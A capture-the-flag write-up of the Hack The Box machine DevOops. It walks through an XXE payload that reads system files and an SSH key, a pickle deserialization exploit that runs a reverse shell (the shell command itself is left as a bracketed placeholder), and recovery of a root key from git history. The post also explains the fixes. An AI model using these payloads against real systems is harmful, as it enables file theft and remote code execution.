---
layout: post
title: "The Key Was Never Deleted"
subtitle: "HTB DevOops, where an XML upload reads you a private key and the root credential was sitting in git history the whole time, one commit deep"
date: 2018-10-20 12:00:00 +0000
description: "An XML upload form reads a stranger any file on disk, then the box hands you root because a deleted secret was never actually deleted, only hidden one commit back in git."
image: /assets/og/the-key-was-never-deleted.png
tags: [hackthebox, writeup]
---

DevOops is a box about things that were supposed to go away and didn't. A developer built a little blog API that accepts XML, and the parser was too trusting, so the upload form will read you any file on the machine if you ask in the right dialect. That gets you a private key and a shell. Then the box twists the knife. Somewhere along the way the developer committed the root SSH key into the project repository, noticed the mistake, and committed again to take it back out. They thought they had cleaned it up. But git does not forget, and the key that was deleted from the working tree is still sitting one commit back in the history, perfectly intact, waiting for anyone who runs `git log`. The whole machine is a lesson about the difference between hiding something and removing it.

```
        D E V O O P S
        =============
        /upload   "send me XML, i'll read it back to you"
                  <!ENTITY x SYSTEM "file:///home/roosa/.ssh/id_rsa">
                        |
                        v
        the parser reads the file out loud. there's your shell.

        then, in the repo:
        commit  add root key for the deploy            (oops)
        commit  reverted accidental commit             (phew?)
                        |
        git never threw the first one away. it's right there.
                                                            鍵
```

## 0x01 · the storefront

Two ports, and the second one is the whole story.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
5000/tcp open  http    Gunicorn 19.7.1
```

Port 5000 served by Gunicorn is a tell on its own. Gunicorn is the workhorse that runs Python web apps in production, and the default port 5000 is what Flask hands you the first time you start a project. So before touching the site you already know the shape of it. Somebody wrote a Python web application, probably as a side project, and left it running. That matters, because a hand-rolled app from a single developer tends to carry single-developer mistakes, the kind that never survive a code review because there was never a reviewer.

A quick `gobuster` against the site finds the two endpoints that matter. There is `/feed`, which just hands back an image, and there is `/upload`, which presents a small test API that wants XML. The page is even polite enough to tell you the fields it expects: an Author, a Subject, and some Content. It is asking you to send it structured text and promising to read that text back to you. Hold onto that promise. It is the entire front door.

## 0x02 · the parser that reads anything aloud

When a web app accepts XML and reflects the parsed values back at you, the first thing to try is XXE, which stands for XML External Entity injection. To understand why it works you have to know one strange thing about XML. The format lets a document define its own shorthand abbreviations, called entities, at the top of the file. Normally an entity is harmless, just "wherever I write `&company;`, substitute the words Acme Corporation." But the XML standard also lets an entity point at a file on disk with the `SYSTEM` keyword, and a naive parser will dutifully go read that file and paste its contents in wherever the shorthand appears.

Think of it like a printed form that lets you define your own custom stamps in the margin. You write "stamp number one means my home address," and everywhere you ink stamp number one, the clerk writes your address. Harmless. But the form also lets you define "stamp number one means: go to the filing cabinet, pull employee Roosa's private folder, and copy whatever is inside here." A careful clerk refuses. This clerk shrugs and starts copying, because nobody ever told it that some instructions are off limits.

So you declare an entity that points at a file you want, and you reference it inside one of the fields the app echoes back.

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE item [
  <!ENTITY iceberg SYSTEM "file:///etc/passwd">
]>
<item>
  <Author>&iceberg;</Author>
  <Subject>test</Subject>
  <Content>hello</Content>
</item>
```

The response comes back with the contents of `/etc/passwd` sitting where the author name should be. The form read the file out loud. From `passwd` you learn the box has a user named `roosa`, and a private SSH key is the obvious next ask. You point the same entity at `file:///home/roosa/.ssh/id_rsa` and the parser reads that out loud too, the whole `-----BEGIN RSA PRIVATE KEY-----` block, line by line, into the Author field. This step gets tedious by hand because of XML quirks around newlines and special characters, so most people wrap it in a few lines of Python that fire the request and carve the file out of the response.

A key with no password sitting in front of it is just a door key. Save it, fix the permissions so SSH stops complaining, and walk in.

```
$ chmod 600 roosa.key
$ ssh -i roosa.key roosa@10.10.10.91
roosa@devoops:~$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa)
roosa@devoops:~$ cat user.txt
████████████████████████████████
```

## 0x03 · the endpoint nobody advertised

The XXE is the clean way in, but it is worth knowing the box left a second, louder door unlocked, because it teaches a different sin. Reading the app's own source through the same file-read primitive turns up `feed.py`, and inside it there is an endpoint that the website never links to and never mentions, a POST handler at `/newpost`. It takes a blob of base64, decodes it, and feeds the result straight into Python's `pickle` module.

Pickle is Python's way of freezing a live object to a string of bytes and thawing it back later. The catastrophe is that thawing is not passive. A pickle can carry instructions for how to rebuild itself, and one of those instructions is "call this function with these arguments," which the loader obeys the instant it unpacks the data. Picture a flat-pack furniture box. You expect the assembly card inside to say "attach panel A to panel B." Pickle lets the card instead say "before you build anything, run to the kitchen and pour bleach in the coffee," and the worker, trusting the card completely, does exactly that the moment the box is opened. Handing untrusted pickle to `loads()` is handing a stranger the assembly card.

You build a tiny class whose magic `__reduce__` method names a command to run, freeze it, and POST it.

```python
import os, pickle, base64, requests
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]",))
data = base64.urlsafe_b64encode(pickle.dumps(Exploit()))
requests.post("http://10.10.10.91:5000/newpost", data=data)
```

The reverse shell is bracketed on purpose. Spell it out for your own listener. The instant the server unpacks the object it runs your command, and a prompt drops back as `roosa`, the same user the XXE key belongs to. Two unrelated bugs, one destination. The box is generous like that.

## 0x04 · the secret that was never removed

Roosa is not root, and there is no exotic kernel trick waiting. The privilege escalation here is pure archaeology. Poke around the home directory and there is a project repository at `~/work/blogfeed`, the source of the very app you just exploited, under version control. The first reflex with any repo you can read is to walk its history, because a repository is not a snapshot of the current files. It is a complete recording of every change ever made, and developers leak secrets into that recording constantly and then forget the recording exists.

```
roosa@devoops:~/work/blogfeed$ git log --oneline
33e87c3 reverted accidental commit with proper key
d387abf add key for feed integration from tnerprise backend
...
```

Read those two lines slowly, newest on top. Someone added a key, then immediately reverted it. From the working tree the key is gone, deleted, nowhere on disk. A developer scanning the current files would swear it was handled. But a revert in git does not erase the original change. It stacks a second change on top that undoes the first, and both changes stay in the log forever. The key is still alive inside commit `d387abf`, exactly as it was the moment it was committed. Think of it like a whiteboard where instead of erasing, you photograph the board after every edit. You can wipe the marker off, but the photo from before the wipe is still in the stack, and anyone who flips back through the stack sees what you wrote.

So you flip back one commit and pull the file out.

```
roosa@devoops:~/work/blogfeed$ git show d387abf
...
+resources/integration/authcredentials.key
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA...
+-----END RSA PRIVATE KEY-----
```

Every line is prefixed with a `+` because git is showing you an added file in a diff, so strip those before you save it. The key inside is not roosa's. It is the integration key for the deploy backend, and on this box that account is root.

```
$ chmod 600 root.key
$ ssh -i root.key root@10.10.10.91
root@devoops:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devoops:~# cat /root/root.txt
████████████████████████████████
```

No exploit. No payload. Just a secret that was deleted from the present and left standing in the past.

## 0x05 · the honest caveat

The XXE here is a real flaw with a real fix. You tell the XML parser to refuse external entities, one configuration line, and the file-read door slams shut. The pickle endpoint is worse only because the fix is "never do this," since pickle on untrusted input has no safe configuration, only safe avoidance. Both are the same old confession the whole industry keeps signing. Somewhere a program took something a stranger sent and treated part of it as an instruction instead of as inert data. An entity reference, a serialized object, a username with a backtick in it. Different costumes, identical bug. The parser and the loader both forgot that input from outside is supposed to be cargo, never the steering wheel.

But the part of this box that should keep a real engineer awake is the last move, because nothing about it is a vulnerability in any scanner's sense. There was no unpatched library, no CVE, no clever payload. A person typed a secret into a file, committed it, felt the cold drop in their stomach, deleted it, and committed again, genuinely believing the problem was solved. The tooling did exactly what it promised. Git's entire purpose is to never lose a change, and it kept that promise perfectly, including the change the developer most wanted lost. You cannot patch your way out of this. A secret that has ever touched a repository is compromised the moment it lands, and the only real fix is to rotate it, to make the leaked thing worthless, because deleting it from the working tree just moves it one commit out of sight and leaves it fully alive for anyone who runs a command every developer knows. Hiding is not removing. The history is the part you have to clean, and almost nobody does.

## 0x06 · outro

```
the form read your file aloud because nobody told it some files are private.
the loader ran your orders because it trusted the box it was handed.
the key was deleted, and deleted, and still it was never gone.

git kept the one change the author begged it to forget.
a secret that has been written down once has been written down forever.

rotate the key. walk the history. wear black.

                                                            EOF
```

---

*HTB: DevOops, retired 13 Oct 2018 (date approximate). A medium Linux box that is really a lecture on trusting input you should not, followed by the oldest mistake in version control. The key you deleted is still in the log.*